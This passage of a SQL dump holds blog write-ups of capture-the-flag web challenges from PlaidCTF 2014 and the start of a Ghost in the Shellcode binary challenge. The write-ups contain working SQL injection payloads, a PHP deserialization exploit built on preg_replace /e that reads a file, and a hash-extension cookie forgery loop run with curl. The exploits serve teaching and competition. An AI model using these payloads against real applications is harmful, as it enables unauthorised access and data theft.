right to the end, which means ending the query with \"resetinfo=\'\", so the \"resetinfo\" field gets set to all the remaining crap\n\nSo, let\'s give this a shot!\n./dnsxss --payload=\"test\', email=\'test1234\', resetinfo=\'\"\nThen I create an account, reset the password from my ip address, and refresh. The full query—dumped from my test server—looks like:\nupdate users set password=\'catf7a252e008616c94\', resetinfo=\'test.skullseclabs.orgArray ( [0] => Array ( [host] => test.skullseclabs.org [class] => IN [ttl] => 1 [type] => TXT [txt] => test\', email=\'test1234\', resetinfo=\'.test.skullseclabs.org [entries] => Array ( [0] => test\', email=\'test1234\', resetinfo=\' ) ) ) \' where username=\'ron\'\nAs you can see, that\'s quite a mess (note that the injected stuff appears twice.. super annoying). After that runs, the reset-password page looks like:\n\r\nDon\'t worry ron, we\'re emailing you a new password at test1234\r\n\r\nIf you are not ron, we\'ll tell them something fishy is going on!\r\n\nSweet! I successfully changed my password!\nBut... what am I looking for?\nMySQL has this super handy database called information_schema, which contains tables called \'SCHEMATA\', \'TABLES\', and \'COLUMNS\', and it\'s usually available for anybody to inspect. Let\'s dump SCHEMATA.SCHEMA_NAME from everything:\n./dnsxss --payload=\"test\', email=(select group_concat(SCHEMA_NAME separator \', \') from information_schema.SCHEMATA), resetinfo=\'\"\nThen refresh a couple times to find:\n\r\nDon\'t worry ron, we\'re emailing you a new password at information_schema, mysql, performance_schema, whatscat\r\n\r\nIf you are not ron, we\'ll tell them something fishy is going on!\r\n\nGreat! Three of those are built-in databases, but \'whatscat\' looks interesting. Now let\'s get table names from whatscat:\n./dnsxss --payload=\"test\', email=(select group_concat(TABLE_NAME separator \', \') from information_schema.TABLES where TABLE_SCHEMA=\'whatscat\'), resetinfo=\'\"\nLeads to:\n\r\nDon\'t worry ron, we\'re emailing you a new password at comments, flag, pictures, users\r\n\r\nIf you are not ron, we\'ll tell them something fishy is going on!\r\n\nflag! Sweet! That\'s a pretty awesome looking table! Now we\'re one simple step away... what columns does \'flag\' contain?\n./dnsxss --payload=\"test\', email=(select group_concat(COLUMN_NAME separator \', \') from information_schema.COLUMNS where TABLE_NAME=\'flag\'), resetinfo=\'\"\nLeads to:\n\r\nDon\'t worry ron, we\'re emailing you a new password at flag\r\n\r\nIf you are not ron, we\'ll tell them something fishy is going on!\r\n\nAll right, we know the flag is in whatscat.flag.flag, so we write one final query:\n./dnsxss --payload=\"test\', email=(select group_concat(flag separator \', \') from whatscat.flag), resetinfo=\'\"\nWhich gives us:\n\r\nDon\'t worry ron, we\'re emailing you a new password at 20billion_d0llar_1d3a\r\n\r\nIf you are not ron, we\'ll tell them something fishy is going on!\r\n\nAnd now we dance.\nConclusion\nIf you\'re interested in DNS attacks—this scenario and a whole bunch of others—come see my talk at BSidesQuebec this June!!!', '\'DNS\', \'Hacking\', \'PlaidCTF 2014\', \'Tools\'', 'https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-300-whatscat-sql-injection-via-dns');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (27, 'PlaidCTF writeup for Web-200 – kpop (bad deserialization)', 'Ron Bowes', '2014-4-13', 'Hello again!\nThis is my second writeup from PlaidCTF this past weekend! It\'s for the Web level called kpop, and is about how to shoot yourself in the foot by misusing serialization (download the files). There are at least three levels I either solved or worked on that involved serialization attacks (mtpox, reeekeeeeee, and this one), which is awesome because this is a seriously undersung attack. Good on the PPP!\n\nBad serialization\nI\'ll start off with a quick summary of how vulnerable serialization happens, then will move onto specifics of this level.\nGenerally, when an attacker provides code for a service to deserialize, it\'s frequently bad news. Basically, at best, it lets an attacker provide values to protected and possibly private fields. At worst, it allows an attacker to control function pointers or overloaded operators that can lead directly to code execution.\nIn the case of PHP, you can\'t serialize functions, so it\'s harder to shoot yourself in the food. However, you can control private and protected fields, which is where this attack comes in.\nClass overload\nThere were so many classes with interdepencies, I got quickly overloaded. I\'m really bad at visualizing programs. I ended up grabbing a whiteboard and going outside, where I produced this:\n\nIn retrospect, that was way overkill, but it was nice to get some fresh air.\nMy goal was to find every variable in every class that got serialized, and to figure out every function in which it was used. I knew that both the Lyrics class and lyrics strings got deserialized, one from a cookie and the other from a POST argument, and I also knew that Lyric contained references to a bunch of other classes (see the diagram).\nMy goal was cut short when I noticed the preg_replace() was being called with a string that I controlled via deserialization! I\'ve many times told people to avoid putting attacker-controlled strings into a regular expression, because regular expressions do all kinds of crazy things. I headed over to http://php.net/preg_replace and, sure enough, found this note:\nThe /e modifier is deprecated. Use preg_replace_callback() instead. See the PREG_REPLACE_EVAL documentation for additional information about security risks. \nAnd on a linked page:\n\r\ne (PREG_REPLACE_EVAL)\r\nWarning This feature has been DEPRECATED as of PHP 5.5.0. Relying on this feature is highly discouraged.\r\n\r\nIf this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string. ...\r\n\nBeautiful, sounds like exactly what I want!\nExploit\nFrom there, I made a copy of classes.php called evil_classes.php, with the following changes:\n\r\n$ diff -ub classes.php evil_classes.php\r\n--- classes.php 2014-04-12 14:54:44.000000000 -0700\r\n+++ evil_classes.php    2014-04-12 14:54:44.000000000 -0700\r\n@@ -59,7 +59,7 @@\r\n   function __construct($name, $group, $url) {\r\n     $this->name = $name; $this->group = $group;\r\n     $this->url = $url;\r\n-    $fltr = new OutputFilter(\"/\\[i\\](.*)\\[\\/i\\]/i\", \"<i>\\\\1</i>\");\r\n+    $fltr = new OutputFilter(\"/.*/e\", \"print(file_get_contents(\'/home/flag/flag\'))\");\r\n     $this->logger = new Logger(new LogWriter_File(\"song_views\", new LogFileFormat(array($fltr), \"\\n\")));\r\n   }\r\n   function __toString() {\r\n@@ -92,6 +92,10 @@\r\n   }\r\n };\r\n\r\n+$l = new Lyrics(\"lyrics\", new Song(\"name\", \"group\", \"url\"));\r\n+print(base64_encode(serialize($l)));\r\n+print(\"\\n\");\r\n+\r\n class User {\r\n   static function addLyrics($lyrics) {\r\n     $oldlyrics = array();\r\n\nThen I ran it, getting:\nTzo2OiJMeXJpY3MiOjI6e3M6OToiACoAbHlyaWNzIjtzOjY6Imx5cmljcyI7czo3OiIAKgBzb25nIjtPOjQ6IlNvbmciOjQ6e3M6OToiACoAbG9nZ2VyIjtPOjY6IkxvZ2dlciI6MTp7czoxMjoiACoAbG9nd3JpdGVyIjtPOjE0OiJMb2dXcml0ZXJfRmlsZSI6Mjp7czoxMToiACoAZmlsZW5hbWUiO3M6MTA6InNvbmdfdmlld3MiO3M6OToiACoAZm9ybWF0IjtPOjEzOiJMb2dGaWxlRm9ybWF0IjoyOntzOjEwOiIAKgBmaWx0ZXJzIjthOjE6e2k6MDtPOjEyOiJPdXRwdXRGaWx0ZXIiOjI6e3M6MTU6IgAqAG1hdGNoUGF0dGVybiI7czo1OiIvLiovZSI7czoxNDoiACoAcmVwbGFjZW1lbnQiO3M6NDM6InByaW50KGZpbGVfZ2V0X2NvbnRlbnRzKCcvaG9tZS9mbGFnL2ZsYWcnKSkiO319czo3OiIAKgBlbmRsIjtzOjE6IgoiO319fXM6NzoiACoAbmFtZSI7czo0OiJuYW1lIjtzOjg6IgAqAGdyb3VwIjtzOjU6Imdyb3VwIjtzOjY6IgAqAHVybCI7czozOiJ1cmwiO319\nBefore the base64, it looks like this:\nO:6:\"Lyrics\":2:{s:9:\"*lyrics\";s:6:\"lyrics\";s:7:\"*song\";O:4:\"Song\":4:{s:9:\"*logger\";O:6:\"Logger\":1:{s:12:\"*logwriter\";O:14:\"LogWriter_File\":2:{s:11:\"*filename\";s:10:\"song_views\";s:9:\"*format\";O:13:\"LogFileFormat\":2:{s:10:\"*filters\";a:1:{i:0;O:12:\"OutputFilter\":2:{s:15:\"*matchPattern\";s:5:\"/.*/e\";s:14:\"*replacement\";s:43:\"print(file_get_contents(\'/home/flag/flag\'))\";}}s:7:\"*endl\";s:1:\"\r\n\";}}}s:7:\"*name\";s:4:\"name\";s:8:\"*group\";s:5:\"group\";s:6:\"*url\";s:3:\"url\";}}\nYup, our evil regular expression is there! Now we just set the \'lyrics\' cookie to that (I like using the Web developer addon for firefox), visit http://54.234.123.205/import.php (note: the address won\'t work after a couple days), hit \'enter\' in the field, and watch the money roll in!\n\r\nOne_of_our_favorite_songs_is_bubble_pop\r\nOne_of_our_favorite_songs_is_bubble_pop\r\nOne_of_our_favorite_songs_is_bubble_pop\r\n<html>\r\n  <head>\r\n    <title>The Plague\'s KPop Fan Page - Imported Songs</title>\r\n  </head>\r\n  <body>\r\n    <p>Your songs have been imported! Go back to the <a href=\"songs.php\">songs</a> page to see them!</p>\r\n  </body>\r\n</html>', '\'Hacking\', \'PlaidCTF 2014\'', 'https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-200-kpop-bad-deserialization');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (28, 'PlaidCTF writeup for Web-150 – mtpox (hash extension attack)', 'Ron Bowes', '2014-4-13', 'Hey folks,\nThis is going to be my first of a couple writeups about this past weekend\'s CTF: PlaidCTF!\nMy first writeup is for a 150-point Web level called mtpox. I chose this one to do first not only because it\'s the first level I completed, but also because the primary vulnerability was a hash extension issue, and I wrote one of most popular tools for exploiting those. So it\'s like the level made for me!\n(Actually, there\'s another level that I wrote a less popular tool for. I\'ll talk about that one in my next post. :) )\n\nJust for fun, here\'s an activity graph on github for the weekend:\n\nLots of traffic!\nStep 1: source code disclosure\nSo, I actually didn\'t solve this part, I was still trying to get access to PlaidCTF while my teammate Andrew Orr solved it.\nBasically, you arrive at a site and browse around:\n\nhttp://54.211.6.40/index.php\nhttp://54.211.6.40/index.php?page=about\n...etc.\n\n(Note that those IP addresses won\'t work for long, they might add new ones for a few days after the competition, then they\'re gone forever)\nThere\'s also an interesting link at the top:\n\nhttp://54.211.6.40/admin.php\n\nWhich, when clicked, says \"Sorry, not authorized\". I guess we have to get authorized!\nWhat Andrew discovered is that you can modify the ?page= request parameter to read the admin.php page:\n\nhttp://54.211.6.40/?page=admin.php\n\nWhich returns:\n\r\n<?php\r\n  require_once(\"secrets.php\");\r\n  $auth = false;\r\n  if (isset($_COOKIE[\"auth\"])) {\r\n     $auth = unserialize($_COOKIE[\"auth\"]);\r\n     $hsh = $_COOKIE[\"hsh\"];\r\n     if ($hsh !== hash(\"sha256\", $SECRET . strrev($_COOKIE[\"auth\"]))) {\r\n       $auth = false;\r\n     }\r\n  }\r\n  else {\r\n    $auth = false;\r\n    $s = serialize($auth);\r\n    setcookie(\"auth\", $s);\r\n    setcookie(\"hsh\", hash(\"sha256\", $SECRET . strrev($s)));\r\n  }\r\n  if ($auth) {\r\n    if (isset($_GET[\'query\'])) {\r\n      $link = mysql_connect(\'localhost\', $SQL_USER, $SQL_PASSWORD) or die(\'Could not connect: \' . mysql_error());\r\n      mysql_select_db($SQL_DATABASE) or die(\'Could not select database\');\r\n      $qstr = mysql_real_escape_string($_GET[\'query\']);\r\n      $query = \"SELECT amount FROM plaidcoin_wallets WHERE id=$qstr\";\r\n      $result = mysql_query($query) or die(\'Query failed: \' . mysql_error());\r\n      $line = mysql_fetch_array($result, MYSQL_ASSOC);\r\n      foreach ($line as $col_value) {\r\n        echo \"Wallet \" . $_GET[\'query\'] . \" contains \" . $col_value . \" coins.\";\r\n      }\r\n    } else {\r\n       echo \"<html><head><title>MtPOX Admin Page</title></head><body>Welcome to the admin panel!<br /><br /><form name=\'input\' action=\'admin.php\' method=\'get\'>Wallet ID: <input type=\'text\' name=\'query\'><input type=\'submit\' value=\'Submit Query\'></form></body></html>\";\r\n    }\r\n  }\r\n  else echo \"Sorry, not authorized.\";\r\n?>\r\n\nThere is an obvious SQL Injection vulnerability here:\n\r\n      mysql_select_db($SQL_DATABASE) or die(\'Could not select database\');\r\n      $qstr = mysql_real_escape_string($_GET[\'query\']);\r\n      $query = \"SELECT amount FROM plaidcoin_wallets WHERE id=$qstr\";\r\n\n... which I\'ll cover at the end, but first we need to access the page!\nIn comes hash extension\nIf you\'ve never heard of hash extension attacks, check out the blog I wrote about them —it\'s the most popular non-Wikipedia result on Google (just sayin\' :) ). I\'m not going to go over the attacks in general, that page does a pretty thorough job of it. Please check it out if you get lost!\nAnyway, the second I saw this line:\n\r\n     if ($hsh !== hash(\"sha256\", $SECRET . strrev($_COOKIE[\"auth\"]))) {\r\n\nI immediately recognized the hash extension vulnerablity. If you ever see somebody concatenating a secret with something in a hashing function, consider hash extension.\nGreat, so what\'s that mean? It means that I can add arbitrary data to the end of the string, and generate a new authentication token for it. What\'s that get us?\nWell, to understand that, we have to first understand how the authentication works for this site.\nWhen you visit for the first time—with no cookie—this code executes:\n\r\n    $auth = false;\r\n    $s = serialize($auth);\r\n    setcookie(\"auth\", $s);\r\n    setcookie(\"hsh\", hash(\"sha256\", $SECRET . strrev($s)));\r\n\nYour cookie is a serialized PHP datatype, in this case simply \'false\'. The hsh token is generated by prepending a secret to the reversed version of the authentication string (and btw, I really appreciate that they decided to reverse it; this would have been difficult or impossible otherwise!)\nThose two cookies are set. Then later, when you return, the cookies are sent back and validated:\n\r\n  if (isset($_COOKIE[\"auth\"])) {\r\n     $auth = unserialize($_COOKIE[\"auth\"]);\r\n     $hsh = $_COOKIE[\"hsh\"];\r\n     if ($hsh !== hash(\"sha256\", $SECRET . strrev($_COOKIE[\"auth\"]))) {\r\n       $auth = false;\r\n     }\r\n\n$auth is read from the token, then the token is validated. If the validation fails, it\'s set to false.\nCreating a valid token\nBasically, I want to make my token deserialize to \'true\', somehow, then generate a proper checksum for it. First, let\'s look at the cookies it sets! I used the Firefox plugin for this, because it makes it easy to view and edit cookies. But you can use any technique you want for that. I find out that my cookies for mtpox are:\n\nauth=b%3A0%3B\nhsh=ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3\n\nb%3A0%3B actually decodes to \"b:0;\". Boolean zero (false). The true value will be \"b:1;\". That\'s the value I want to append. The one important thing I *don\'t* know is the length of $SECRET, which is unfortunately important for this attack. But, I can bruteforce that!\nBut before I do anything, I need to tweak hash_extender a little bit, because this challenge requires the string to be reversed before being validated. After all, it wouldn\'t be a proper CTF if existent tools could do everything! Here\'s the diff against the latest git version:\n\r\ndiff --git a/hash_extender.c b/hash_extender.c\r\nindex 408a4ca..370e52c 100644\r\n--- a/hash_extender.c\r\n+++ b/hash_extender.c\r\n@@ -75,18 +75,15 @@ static void output(options_t *options, char *type, uint64_t secret_length, uint8\r\n   }\r\n   else\r\n   {\r\n-    printf(\"Type: %s\\n\", type);\r\n+    uint8_t reversed[new_data_length];\r\n+    int i;\r\n\r\n-    printf(\"Secret length: %\"PRId64\"\\n\", secret_length);\r\n+    for(i = 0; i < new_data_length; i++)\r\n+      reversed[new_data_length - i - 1] = new_data[i];\r\n\r\n-    printf(\"New signature: \");\r\n     output_format(options->out_signature_format, new_signature, hash_type_digest_size(type));\r\n-    printf(\"\\n\");\r\n-\r\n-    printf(\"New string: \");\r\n-    output_format(options->out_data_format, new_data, new_data_length);\r\n-    printf(\"\\n\");\r\n-\r\n+    printf(\",\");\r\n+    output_format(options->out_data_format, reversed, new_data_length);\r\n     printf(\"\\n\");\r\n   }\r\n }\r\n\nBasically, we just reverse the string first, and tweak the output to make it easier to script. Then, we run hash_extender like this:\n\r\n./hash_extender --data \';0:b\' -s ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3 --append \';1:b\' --secret-min=1 --secret-max=32 --out-data-format=html\r\n\nThis tells it to try every secret length between 1 and 32 bytes. One of them is bound to work!\n<UPDATE> Thanks to an anonymous commenter who informed me that PlaidCTF actually tells us what the length of $SECRET was. The main Web site was down for the whole time I was working on this level (it was right at the start), so I never actually read the description :(\nHere\'s what it looks like running:\n\r\n$ ./hash_extender --data \';0:b\' -s ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3 --append \';1:b\' --secret-min=1 --secret-max=32 --out-data-format=html\r\n967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1,b%3a1%3b%28%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b\r\n967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1,b%3a1%3b0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b\r\n967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1,b%3a1%3b8%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b\r\n967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1,b%3a1%3b%40%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b\r\n967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1,b%3a1%3bH%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b\r\n967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1,b%3a1%3bP%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b\r\n...etc\r\n\nThen we can throw together a quick little shellscript to feed each of them into curl:\n\r\nfor i in `./hash_extender --data \';0:b\' -s ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3 --append \';1:b\' --secret-min=1 --secret-max=32 --out-data-format=html`; do HASH=`echo $i | sed \'s/,.*//\'`; DATA=`echo $i | sed \'s/.*,//\'`; echo \"$DATA :: $HASH\"; curl -b \"auth=$DATA;hsh=$HASH\" http://54.211.6.40/admin.php; echo; done\r\n\nIt\'s a big ugly mess, but that\'s the way it is with one-liners. :)\nRun that against the real server:\n\r\nfor i in `./hash_extender --data \';0:b\' -s ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3 --append \';1:b\' --secret-min=1 --secret-max=32 --out-data-format=html`; do HASH=`echo $i | sed \'s/,.*//\'`; DATA=`echo $i | sed \'s/.*,//\'`; echo \"$DATA :: $HASH\"; curl -b \"auth=$DATA;hsh=$HASH\" http://54.211.6.40/admin.php; echo; done\r\nb%3a1%3b%28%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b :: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1\r\nSorry, not authorized.\r\nb%3a1%3b0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b :: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1\r\nSorry, not authorized.\r\nb%3a1%3b8%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b :: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1\r\nSorry, not authorized.\r\nb%3a1%3b%40%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b :: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1\r\nSorry, not authorized.\r\nb%3a1%3bH%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b :: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1\r\nSorry, not authorized.\r\nb%3a1%3bP%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b :: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1\r\nSorry, not authorized.\r\nb%3a1%3bX%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b :: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1\r\nSorry, not authorized.\r\nb%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b :: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1\r\n<html><head><title>MtPOX Admin Page</title></head><body>Welcome to the admin panel!<br /><br /><form name=\'input\' action=\'admin.php\' method=\'get\'>Wallet ID: <input type=\'text\' name=\'query\'><input type=\'submit\' value=\'Submit Query\'></form></body></html>\r\nb%3a1%3bh%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b :: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1\r\nSorry, not authorized.\r\n\nAnd look at that! We found an admin page! We need the cookies:\n\nauth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b\nhsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1\n\nSo we set those in our browser using whatever technique you want, and go to the admin page!\nSQL Injection\nBasically, on the admin panel, you\'re presented with a very simple HTML form. You can search by wallet id for how many coins they have. For example, if you type wallet 0, you see \"Wallet 0 contains 1333337 coins.\". Easy!\nThis is where one of my biggest complaints about PlaidCTF comes in, and it was endemic throughout the challenge: they don\'t tell you what your goal is. I thought the flag must be \'1333337\' because they simply asked you to break in.\nAnyway, the vulnerable line was this one:\n\r\n      $qstr = mysql_real_escape_string($_GET[\'query\']);\r\n      $query = \"SELECT amount FROM plaidcoin_wallets WHERE id=$qstr\";\r\n\nEven though $qstr is escaped, there aren\'t any quotes around it in the query, and therefore you can inject by simply using a space. For example, if I set my query to \"1 union select id from anothertable\", I\'m now selecting from that other table (and I didn\'t even need quotes!). And this, people, is why you use prepared statements (or equivalent) and you don\'t use mysql_real_escape_string()!\nAnyway, after exploring the server for awhile—I\'m not going to dig into it any further in this writeup, since the same techniques were used in another writeup that\'s a little cleaner to demonstrate—I found a table called plaidcoin_wallets. I could select from it like this:\n\nhttp://54.211.6.40/admin.php?query=1+union+select+id+from+plaidcoin_wallets\n\nAnd boom! I had the flag:\nWallet 1 union select id from plaidcoin_wallets contains flag{phpPhPphpPPPphpcoin} coins.', '\'Hacking\', \'PlaidCTF 2014\', \'Tools\'', 'https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (29, 'Ghost in the Shellcode: fuzzy (Pwnage 301)', 'Ron Bowes', '2014-4-7', 'Hey folks,\nIt\'s a little bit late coming, but this is my writeup for the Fuzzy level from the Ghost in the Shellcode 2014 CTF! I kept putting off writing this, to the point where it became hard to just sit down and do it. But I really wanted to finish before PlaidCTF 2014, which is this weekend so here we are! You can see my other two writeups here (TI-1337) and here (gitsmsg).\nLike my other writeups, this is a \"pwnage\" level, and required the user to own a remote server. Unfortunately, because of my slowness, they\'re no longer running the server, but you can get a copy of the binary at my github page and run it yourself. It\'s a 64-bit Linux ELF executable. It didn\'t have ASLR, and DEP would have been\n\nThe setup\nThe service itself was a fairly simple calculator application, the kind you might make in a Computer Science 101 course. For example:\n\r\n 1 $ nc -vv localhost 4141\r\n 2 localhost [127.0.0.1] 4141 (?) open\r\n 3 Welcome to the super secure parsing engine!\r\n 4 Please select a parser!\r\n 5 \r\n 6 1) Sentence histogram\r\n 7 2) Sorted characters (ascending)\r\n 8 3) Sorted characters (decending)\r\n 9 4) Sorted ints (ascending)\r\n10 5) Sorted ints (decending\r\n11 6) global_find numbers in string\r\n12 2\r\n13 Enter a series of characters to check if it\'s sorted\r\n14 This is a test string\r\n15 is NOT sorted\r\n\nOr the histogram function:\n\r\n 1 $ nc -vv localhost 4141\r\n 2 localhost [127.0.0.1] 4141 (?) open\r\n 3 Welcome to the super secure parsing engine!\r\n 4 Please select a parser!\r\n 5 \r\n 6 1) Sentence histogram\r\n 7 2) Sorted characters (ascending)\r\n 8 3) Sorted characters (decending)\r\n 9 4) Sorted ints (ascending)\r\n10 5) Sorted ints (decending\r\n11 6) global_find numbers in string\r\n12 1\r\n13 Enter a series of characters\r\n14 This is histrogram\r\n15  :2     !:0     \":0     #:0     $:0\r\n16  %:0     &:0     \':0     (:0     ):0\r\n17  *:0     +:0     ,:0     -:0     .:0\r\n18  /:0     0:0     1:0     2:0     3:0\r\n19  4:0     5:0     6:0     7:0     8:0\r\n20  9:0     ::0     ;:0     <:0     =:0\r\n21  >:0     ?:0     @:0     A:0     B:0\r\n22  C:0     D:0     E:0     F:0     G:0\r\n23  H:0     I:0     J:0     K:0     L:0\r\n24  M:0     N:0     O:0     P:0     Q:0\r\n25  R:0     S:0     T:1     U:0     V:0\r\n26  W:0     X:0     Y:0     Z:0     [:0\r\n27  \\:0     ]:0     ^:0     _:0     `:0\r\n28  a:1     b:0     c:0     d:0     e:0\r\n29  f:0     g:1     h:2     i:3     j:0\r\n30  k:0     l:0     m:1     n:0     o:1\r\n31  p:0     q:0     r:2     s:3     t:1\r\n32  u:0     v:0     w:0     x:0     y:0\r\n33  z:0     {:0     |:0     }:0\r\n\nStraight forward!\nCode security\nThe blurb for the application mentioned their unbreakable security wrapper. Sounds interesting, but what\'s that even mean? Well, if you open up the code in IDA and poke around a bit, you\'ll find that after opening a socket and accepting a connection, it forks and calls handleConnection():\n\r\n.text:004014C1 handleConnection proc near              ; DATA XREF: main+3Bo\r\n.text:004014C1\r\n.text:004014C1 var_4           = dword ptr -4\r\n.text:004014C1\r\n.text:004014C1                 push    rbp\r\n.text:004014C2                 mov     rbp, rsp\r\n.text:004014C5                 sub     rsp, 10h\r\n.text:004014C9                 mov     [rbp+var_4], edi ; var_4 = socket\r\n.text:004014CC                 mov     eax, 0\r\n.text:004014D1                 call    initFunctions   ; Store pointers to a bunch of functions\r\n.text:004014D6                 mov     eax, [rbp+var_4]\r\n.text:004014D9                 mov     dword ptr cs:global_f+48h, eax\r\n.text:004014DF                 mov     rax, qword ptr cs:global_f+20h ; rax = callFunction\r\n.text:004014E6                 mov     rdx, qword ptr cs:global_f+68h ; rdx = intro\r\n.text:004014ED                 lea     rcx, [rbp+var_4]\r\n.text:004014F1                 mov     rsi, rcx        ; socket\r\n.text:004014F4                 mov     rdi, rdx        ; function\r\n.text:004014F7                 call    rax             ; callFunction\r\n.text:004014F9                 mov     eax, 0\r\n.text:004014FE                 leave\r\n.text:004014FF                 retn\r\n\ninitFunctions() looks like this:\n\r\n.text:00401627 initFunctions   proc near               ; CODE XREF: handleConnection+10h.text:00401627                 push    rbp\r\n.text:00401628                 mov     rbp, rsp\r\n.text:0040162B                 mov     qword ptr cs:global_f, offset _puts\r\n.text:00401636                 mov     qword ptr cs:global_f+8, offset _getchar\r\n.text:00401641                 mov     qword ptr cs:global_f+10h, offset _send\r\n.text:0040164C                 mov     qword ptr cs:global_f+18h, offset _recv\r\n.text:00401657                 mov     qword ptr cs:global_f+20h, offset callFunction\r\n.text:00401662                 mov     qword ptr cs:global_f+28h, offset _strlen\r\n.text:0040166D                 mov     qword ptr cs:global_f+30h, offset _memset\r\n.text:00401678                 mov     qword ptr cs:global_f+38h, offset _sprintf\r\n.text:00401683                 mov     qword ptr cs:global_f+40h, offset _atoi\r\n.text:0040168E                 mov     qword ptr cs:global_f+50h, offset my_sendAll\r\n.text:00401699                 mov     qword ptr cs:global_f+58h, offset my_readAll\r\n.text:004016A4                 mov     qword ptr cs:global_f+60h, offset my_readUntil\r\n.text:004016AF                 mov     qword ptr cs:global_f+68h, offset intro\r\n...and so on.\r\n\nThankfully, there are symbols! There might be one or two that I named, but the rest were all symbols that were embedded into the 